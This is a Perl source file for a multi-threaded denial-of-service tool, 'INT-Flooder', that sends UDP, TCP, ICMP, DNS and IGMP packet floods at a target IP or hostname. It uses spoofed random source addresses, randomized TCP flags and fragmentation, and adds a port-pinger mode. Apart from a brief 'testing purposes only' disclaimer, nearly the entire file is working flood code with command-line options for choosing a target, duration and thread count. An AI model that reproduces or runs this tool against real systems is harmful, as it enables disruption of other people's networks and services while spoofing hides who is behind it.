#!/usr/bin/perl -w
#This is made for testing porpuse only and I am not responsible of any illegal use. 
#Copyright © <INT> 2020

my $depencies_loaded = eval {
  require Net::RawIP;
  Net::RawIP->import();
  
  my @str_random_modules = ('random_string');
  require String::Random;
  String::Random->import(@str_random_modules);
  
  require Net::DNS::Resolver;
  Net::DNS::Resolver->import();
  
  1;
};
if(!$depencies_loaded) {
    print "Install depencies with: 
    sudo apt-get install libnet-rawip-perl libstring-random-perl libnet-dns-perl\n\n";
    
    print "Do you want to run it automaticaly? [y/n]\n";
	my $ans = <STDIN>;
	
	if($ans =~ /y/i) {
        system("sudo apt-get -y install libnet-rawip-perl libstring-random-perl libnet-dns-perl");
	}
	exit 0;
}

use strict;
use warnings;
#use Net::RawIP;
use Getopt::Long;
#use String::Random qw/ random_string /;
use List::Util qw/ shuffle /;
use threads;
use threads::shared;
use Net::Ping;

my ($flood_type, $data_value, $data_value_proc, $is_help, $auto_run);
my $ARG_dest_ip = '127.0.0.1';
my $ARG_check_fail = 0;
my $flood_seconds = 1;
my $ARG_dest_port = 0;
my $flood_threads = 1;
my $hide_packets = 0;
my $is_port_pinger = 0;
my $no_threads = 0;
my $total_packets_ = 0;
share($total_packets_);
my $data_size = 0; my $ARG_frag = -1;
my $flood_delay = 0;
my $tcp_flags_str = "";
my $ARG_src_ip = 'random-once';
my (@tcp_flags, @running_threads); 
my $VERSION = "5.0";
		
GetOptions ("help" => \$is_help,
            "type:s" => \$flood_type,
            "ip:s"   => \$ARG_dest_ip,
            "port:i"  => \$ARG_dest_port,
			"seconds:i"  => \$flood_seconds,
			"data-size:i"  => \$data_size,
			"data-value:s"  => \$data_value,
			"threads:i"  => \$flood_threads,
			"set-flags:s" => \$tcp_flags_str,
			"spoof-ip:s" => \$ARG_src_ip,
			"flood-delay:i" => \$flood_delay,
			"port-pinger" => \$is_port_pinger,
			"no-threads" => \$no_threads,
			"set-frag:i" => \$ARG_frag,
			"y" => \$auto_run,
			"hide-packet-info"   => \$hide_packets);
if($is_help) {	&usage(); } 
if(!($tcp_flags_str eq "")){
    @tcp_flags = split(',', $tcp_flags_str); 
}

if($is_port_pinger){
    print "[Port-Ping] Started on Host: $ARG_dest_ip and Port: $ARG_dest_port!\n";
    &port_pinger($ARG_dest_ip, $ARG_dest_port);
}

print "[Arguments] Validation started ->\n";
my @floods = ("udp", "tcp", "icmp", "dns", "igmp");
if($flood_type && ( grep { $_ eq $flood_type } @floods )){
    print "[✓] Valid Flood type...\n";
} else {
    $ARG_check_fail = 1;
    print "[x] Flood type is invalid!\n";  
}
if($ARG_dest_ip =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) {
    print "[✓] Valid IP check...\n"
} else {
    #$ARG_check_fail = 1;
    print "[!] IP check Failed... x.x.x.x\n";  
	
	eval {
		 my $packet = new Net::RawIP({
         ip => { daddr => $ARG_dest_ip, frag_off => 0, }
      });
      print "[✓] Found IP from hostname...\n";  
      $ARG_check_fail = 2;
      $packet->send;  
      1;
	} or do {
        if($ARG_check_fail == 2){
            $ARG_check_fail = 0;
        } else {
            $ARG_check_fail = 1;
            print "[x] Can't get IP from hostname...\n";  
        }
	};
	
}
    
if($ARG_dest_port =~ /^\d+$/ && $ARG_dest_port >= 0 && $ARG_dest_port < 65536) {
    print "[✓] Valid Port check...\n";
} else {
    $ARG_check_fail = 1;
    print "[x] Port check Failed! 0 for random or 1-65535...\n";  
}

if($data_size =~ /^\d+$/ && ($data_size >= 0 && $data_size <= 65500) || $data_size == -1) {
    print "[✓] Data Size check...\n";
} else {
    $ARG_check_fail = 1;
    print "[x] Packet Size check Failed! 0 for random - 65500...\n";  
}

if($flood_seconds =~ /^\d+$/ && $flood_seconds > 0) {
    print "[✓] Valid Seconds check...\n"
} else {
    $ARG_check_fail = 1;
    print "[x] Seconds check Failed... must be an interger and greater then 0\n";  
}
if(!(($ARG_src_ip =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) || $ARG_src_ip eq "random-once" || $ARG_src_ip eq "random-each" || $ARG_src_ip eq "each-thread")){
    $ARG_check_fail = 1;
    print "[x] Spoof ip check Failed...\n";  
}

if($flood_threads =~ /^\d+$/ && $flood_threads > 0) {
    if($ARG_dest_ip eq '127.0.0.1' && $flood_threads > 1){
        $ARG_check_fail = 1;
        print "[x] Threads check Failed... Multithreads not supported for localhost!\n";  
    } else {
        print "[✓] Valid Threads check...\n";
    }
    if($flood_threads > 20) {
        print "[!] You have selected 20+ threads. This can cause problems, consider revising!\n";
    }
} else {
    $ARG_check_fail = 1;
    print "[x] Threads check Failed... must be an interger and greater then 0\n";  
}
if(!($hide_packets =~ /(0|1)/)) {
    $ARG_check_fail = 1;
    print "[x] Invalid \"--hide-packets\" option, just put it with no value...\n";
}
if($ARG_check_fail == 1) {
	print "\nTerminating program...\nUse --help for help!\n"; exit 0;
}

	print "\n[INT-Flooder]=(".uc($flood_type)." TARGET PREPARED)>\n IP: $ARG_dest_ip | Port: ".(($ARG_dest_port) ? $ARG_dest_port : "random") ." | Seconds: $flood_seconds | DataSize: ".(($data_size) ? "$data_size-bytes" : "random") ." | Threads: $flood_threads\n";
	print "Do you want to execute this? [y/n]\n";
	
	my $ans = $auto_run ? 1 : <STDIN>;
	
	if($ans == 1 || $ans =~ /y/i) {
		$data_value_proc = $data_value ? $data_value : get_random_string()->(1024);
        if($ARG_src_ip eq "random-once"){
            $ARG_src_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
        }
	
		if($no_threads){
			if ($flood_type =~ 'icmp'){
				&icmpflood($ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, 1);
   			} elsif($flood_type =~ 'tcp'){
				&tcpflood($ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, 1);
			} elsif($flood_type =~ 'udp'){
				&udpflood($ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, 1);		
			} elsif($flood_type =~ 'dns'){
				&dnsflood($ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, 1);		
			} elsif($flood_type =~ 'igmpflood'){
				&igmpfloodflood($ARG_dest_ip, $flood_seconds, $data_size, 1);		
			}
			exit 0;
		}
	
	    use vars qw ($p_s $flood_thread $thread_count $count $flood_td $d_checker $d_cc);
    	$flood_td = 0, $thread_count = 0;
    	
		if ($flood_type =~ 'icmp'){
			for(; $thread_count < $flood_threads; $thread_count += 1) {
                $flood_thread = threads->create(\&icmpflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, ($thread_count + 1));
                print "[Thread-".($thread_count + 1)."]: Created and started!\n";
   			}
		} elsif($flood_type =~ 'tcp'){
			if($data_size > 65000) { 
				print("[data-size] on tcp data can't be bigger than 65000!\n"); exit(0);
			}
			for(; $thread_count < $flood_threads; $thread_count += 1) {
    	    	$flood_thread = threads->create(\&tcpflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, ($thread_count + 1));
    	   	 print "[Thread-".($thread_count + 1)."]: Created and started!\n";
   			}
		} elsif($flood_type =~ 'udp'){
			for(; $thread_count < $flood_threads; $thread_count += 1) {
    	    	$flood_thread = threads->create(\&udpflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, ($thread_count + 1));
    	   	 print "[Thread-".($thread_count + 1)."]: Created and started!\n";
   			}
		} elsif($flood_type =~ 'dns'){
			for(; $thread_count < $flood_threads; $thread_count += 1) {
    	    	$flood_thread = threads->create(\&dnsflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, ($thread_count + 1));
    	   	 print "[Thread-".($thread_count + 1)."]: Created and started!\n";
   			}
		} elsif($flood_type =~ 'igmp'){
			for(; $thread_count < $flood_threads; $thread_count += 1) {
    	    	$flood_thread = threads->create(\&igmpflood, $ARG_dest_ip, $flood_seconds, $data_size, ($thread_count + 1));
    	   	 print "[Thread-".($thread_count + 1)."]: Created and started!\n";
   			}
		}
		
	
		print "[Threads]: Sending packets...\n";
	
    	$d_checker = threads->create(\&flooddone);
    	$d_cc = $d_checker->join();
 	
    	for(;$d_checker == 0;){
        	sleep(3);
    	}
		

	} #ENS - $ans


sub icmpflood() {
   my($thread_id, $dest_ip, $source_ip, $dest_port, $source_port, $frag);
   my($packet_size, $packet_data, $packet_id, $data_size);
   my($code, $type);
   my($time, $endtime);
   
   $dest_ip = shift; 
   #$dest_port = shift; 
   $time = shift;
   $data_size = shift;
   $thread_id = shift;
   $packet_id = 0;
   $source_ip = $ARG_src_ip;
	   
   $endtime = time() + ($time ? $time : 1000000);

   if($data_size == -1) { $packet_data = 0 } else {
     $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
     $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
   }
   #$dest_port = $dest_port ? $dest_port : int(rand(65535));
    if($ARG_src_ip eq "each-thread"){
      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    }
   
   #print "\nStarting icmp flood to $dest_ip for $flood_seconds\n";
   for (;time() <= $endtime;) {

      $code = int(rand(255));
      $type = int(rand(255));
      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
      
      if($ARG_src_ip eq "random-each"){
        $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
      }
      
      if($data_size == 0){
        $packet_size = int(rand(1024-64)+64);
        $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
      }
	  
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dest_ip,
            saddr => $source_ip,
            frag_off => $frag,
         	tos => 0,
		 },
         icmp => {
            code => $code,
            type => $type,
            data => $packet_data,
         }
      });

      eval{
        $packet->send;  
      };
      if($@){
        print $@;
      }
      $total_packets_++; $packet_id++;
      print "[Thread-$thread_id]-(ICMP Request:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] and type: $type -> code: $code, frag: $frag, tos: 0\n" unless $hide_packets;
      ($flood_delay != 0) and sleep $flood_delay;
	}
   print "[Thread-$thread_id]: Flood is finished!\n";
   	
   if(!$no_threads){
	threads->exit();
   }
}

sub tcpflood() {
   my($thread_id, $dest_ip, $source_ip, $dest_port, $dest_port_, $source_port, $frag);
   my($packet_size, $packet_data, $packet_id);
   my($data_size, $is_custom_flags);
   my($urg, $psh, $rst, $fin, $syn, $ack);
   my($time, $endtime);
   
   $dest_ip = shift; 
   $dest_port = shift; 
   $time = shift;
   $data_size = shift;
   $thread_id = shift;
   $packet_id = 0;
   $source_ip = $ARG_src_ip;

    if(scalar(@tcp_flags) != 0){
      	$urg = ( grep { $_ eq "urg"} @tcp_flags ) ? 1 : 0;
      	$psh = ( grep { $_ eq "psh"} @tcp_flags ) ? 1 : 0;
      	$rst = ( grep { $_ eq "rst"} @tcp_flags ) ? 1 : 0;
      	$fin = ( grep { $_ eq "fin"} @tcp_flags ) ? 1 : 0;
      	$syn = ( grep { $_ eq "syn"} @tcp_flags ) ? 1 : 0;
      	$ack = ( grep { $_ eq "ack"} @tcp_flags ) ? 1 : 0;
	}
	  
    $endtime = time() + ($time ? $time : 1000000);

    if($data_size == -1) { $packet_data = 0 } else {
	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
    }
    if($ARG_src_ip eq "each-thread"){
      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    }
   
    #print "\nStarting tcp flood to $dest_ip for $flood_seconds seconds.\n";
    for (;time() <= $endtime;) {
   
      $source_port = int(rand(65535)); #rand pocinje od 0
      $dest_port_ = $dest_port ? $dest_port : int(rand(65535));
      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
      
      if(scalar(@tcp_flags) == 0){
      	$urg = int(rand(2)); 
      	$psh = int(rand(2));
      	$rst = int(rand(2));
      	$fin = int(rand(2));
      	$syn = int(rand(2));
      	$ack = int(rand(2));
      	#print "[$urg $psh $rst $fin $syn $ack]\n"
	  }
        
      if($ARG_src_ip eq "random-each"){
        $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
      }
           	
      if($data_size == 0){
        $packet_size = int(rand(1024-64)+64);
        $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
      }

      my $packet = new Net::RawIP({
         ip => {
            daddr => $dest_ip,
            saddr => $source_ip,
            frag_off => $frag,
         },
         tcp => {
            source => $source_port,
            dest => $dest_port_,
            urg => $urg,
            psh => $psh,
            rst => $rst,
            fin => $fin,
            syn => $syn,
            ack => $ack,
   			data => $packet_data,
         }
      });

      eval{
        $packet->send;  
      };
      if($@){
       print "\n[Thread-$thread_id]-(TCP Packet:$packet_id) Rejected with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n-> Flags: urg: $urg, psh: $psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n" unless $hide_packets;
      } else {
        $total_packets_++; $packet_id++; 
        print "\n[Thread-$thread_id]-(TCP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n-> Flags: urg: $urg, psh: $psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n" unless $hide_packets;
      }
      ($flood_delay != 0) and sleep $flood_delay;
   }
   print "[Thread-$thread_id]: Flood is finished!\n";
   if(!$no_threads){
	threads->exit();
   }
  # print "Used data value: ". $data_value_proc;
}

sub udpflood() {
   #my($dest_ip, $dest_port, $time, $data_size, $thread_id, $data_value_proc, $endtime, $source_port, $frag, $packet_data, $packet_size, $packet_id);
   my($thread_id, $dest_ip, $source_ip, $dest_port, $dest_port_, $source_port, $frag);
   my($packet_size, $packet_data, $packet_id);
   my($data_size);
   my($time, $endtime);
   
   $dest_ip = shift; 
   $dest_port = shift; 
   $time = shift;
   $data_size = shift;
   $thread_id = shift;
   $packet_id = 0;
   $source_ip = $ARG_src_ip;
   $endtime = time() + ($time ? $time : 1000000);
   
    if($ARG_src_ip eq "each-thread"){
      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    }
   
    if($data_size == -1) { $packet_data = 0 } else {
	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
    }

   #print "\nStarting udp flood to $dest_ip for $flood_seconds seconds.\n";
   for (;time() <= $endtime;) {

      $source_port = int(rand(255));
	  $dest_port_ = $dest_port ? $dest_port : int(rand(65500))+1;
      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
      
      if($ARG_src_ip eq "random-each"){
        $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
      }
      
      if($data_size == 0){
        $packet_size = int(rand(1024-64)+64);
        $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
      }
      
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dest_ip,
            saddr => $source_ip,
            frag_off => $frag,
         },
         udp => {
            source => $source_port,
            dest => $dest_port_,
   			data => $packet_data,
         }
      });

      eval{
        $packet->send;  
      };
      if($@){
        print "[Thread-$thread_id]-(UDP Packet:$packet_id) Rejected with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port   $source_port to $dest_port_, frag: $frag\n" unless $hide_packets;
      } else {
        $packet_id++; $total_packets_++;
        print "[Thread-$thread_id]-(UDP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n" unless $hide_packets;
      }
      ($flood_delay != 0) and sleep $flood_delay;
   }
   print "[Thread-$thread_id]: Flood is finished!\n";
   if(!$no_threads){
	threads->exit();
   }
}

sub dnsflood() {
   my @latters = ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
   my @domains = ("com", "org", "net"); # ...
   my $str_random_doman = @latters[int rand(25)];
   my $str_random_domain_full;
   my $k = 0;

   my($thread_id, $dest_ip, $source_ip, $dest_port, $frag);
   my($packet_size, $packet_data, $packet_id);
   my($data_size);
   my($time, $endtime);
   
   $dest_ip = shift; 
   $dest_port = shift; 
   if($dest_port == 0) {
    $dest_port = 53;
   }
   $time = shift;
   $thread_id = shift;
   $packet_id = 0;
   $source_ip = $ARG_src_ip;
   $endtime = time() + ($time ? $time : 1000000);
    if($ARG_src_ip eq "each-thread"){
      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    }
   
    for (;time() <= $endtime; $k++) {
      if ($k > 50) {#regen random domain
         $str_random_doman = @latters[int rand(9)]; $k = 0;
      }

      if($ARG_src_ip eq "random-each"){
        $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
      }
      
      $str_random_doman .= @latters[int rand(25)];
      $str_random_domain_full = $str_random_doman . "." . @domains[int rand(3)];
      my $dnspacket = new Net::DNS::Packet($str_random_domain_full, "A");
      my $dnsdata = $dnspacket->data;

      
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dest_ip,
            saddr => $source_ip,
            frag_off=>0,
            tos=>0,
         },
         udp => {
            source => 53,
            dest => $dest_port,
   			data => $dnsdata,
         }
      });
      

      $packet->send; $packet_id++; $total_packets_++;
	  print "[Thread-$thread_id]-(DNS Request:$packet_id) Sent with data[type: random] to port $dest_port\n" unless $hide_packets;
      ($flood_delay != 0) and sleep $flood_delay;
   }
   print "[Thread-$thread_id]: Flood is finished!\n";
   if(!$no_threads){
	threads->exit();
   }
}

sub igmpflood(){
   my($thread_id, $dest_ip, $source_ip, $dest_port, $source_port, $frag);
   my($packet_size, $packet_data, $packet_id);
   my($data_size);
   my($time, $endtime);
   
   $dest_ip = shift; 
   $time = shift;
   $data_size = shift;
   $thread_id = shift;
   $packet_id = 0;
   $source_ip = $ARG_src_ip;
   $endtime = time() + ($time ? $time : 1000000);
   
    if($data_size == -1) { $packet_data = 0 } else {
	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
    }
    if($ARG_src_ip eq "each-thread"){
      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
    }
   
   for (;time() <= $endtime;) {

      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;

      if($ARG_src_ip eq "random-each"){
        $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
      }
      
      if($data_size == 0){
        $packet_size = int(rand(1024-64)+64);
        $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
      }
      
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dest_ip,
            saddr => $source_ip,
            frag_off => $frag
         },
         generic => {
   			data => $packet_data
         }
      });

      $packet->send; $packet_id++; $total_packets_++;
	  print "[Thread-$thread_id]-(IGMP Request:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] and frag: $frag\n" unless $hide_packets;
      ($flood_delay != 0) and sleep $flood_delay;
   }
   print "[Thread-$thread_id]: Flood is finished!\n";
   if(!$no_threads){
	threads->exit();
   }


}


#==> END flood functions!

sub flooddone {
	$flood_td = $flood_thread->join();
	
	@running_threads = threads->list(threads::running);
						
	if(@running_threads != 0){
 		print "\n[Threads]: Cleaning threads: ". @running_threads;
   	} else {
		print "\n";
	}
	
	while (@running_threads != 0){
		sleep(1);
  		@running_threads = threads->list(threads::running);
	}
		
 	print "[Packets]: Total sent: $total_packets_\n";
 	print "[Scheduler]: Flood Finished!\n\n";
	return 0;
}


sub get_random_string {
   	return sub {
		my $max = $_[0] + 0;
		return random_string(join '', shuffle((qw/ c C n /) x $max));
	}
}

sub port_pinger {
    my ($host, $port);
    $host = shift;
    $port = shift;
    while(1){
        my $p = Net::Ping->new();
        $p->hires();
        $p->port_number($port);
    
        my ($ret, $duration, $ip) = $p->ping($host, 5.5);
        printf("[INFO]-[ip: $ip, port: $port] is alive (packet return time: %.2f ms)\n", 1000 * $duration) 
            if $ret;
        $p->close();
        
        if(!$ret){
            printf("[INFO]-[ip: $ip, port: $port] is dead (packet return time: %.2f ms)\n", 1000 * $duration);
            if(pingecho($host)){
                printf("[INFO]-[ip: $ip] is alive! (you can scan it with nmap)\n");
            } else {
                printf("[INFO]-[ip: $ip] is dead!\n");
            }
        }
        
        if(!$flood_delay){ sleep 1; } 
        else { sleep $flood_delay; }
        
    }
}

sub usage() {
print "=-=[INT-FLOODER]=-= -> Version $VERSION
Options:

   Required:
	-ip <domain/ipv4>
	-port <0-65536> - 0 is for random
	-seconds <integer>
	-type <udp/icmp/tcp/dns/igmp> 
        
   Optional:
	-data-size <0-65500> - 0 for random, -1 for no data
	-data-value <string> - by default it's random string
	-threads <integer> - by default it's 1, use with strong cpu 
	-set-flags <tcpflag1,tcpflag2,...> - separate flags by comma [tcp only]
	-set-frag - 1 for fragmented packets, 0 for no f. Defualt it random.
	-spoof-ip <ipv4,random-once,random-each> - by default it's random-once
	-old-sockets - this is only for udp if you want to use old sockets
	-no-threads - disables threads so it runs directly
	-hide-packet-info - no messages from packets			
	-flood-delay - delay between creating packets
   Extras:
	-port-pinger - this enables port ping mode
    
[By <INT>] more soon...\n\n";
   
   exit 0;
}

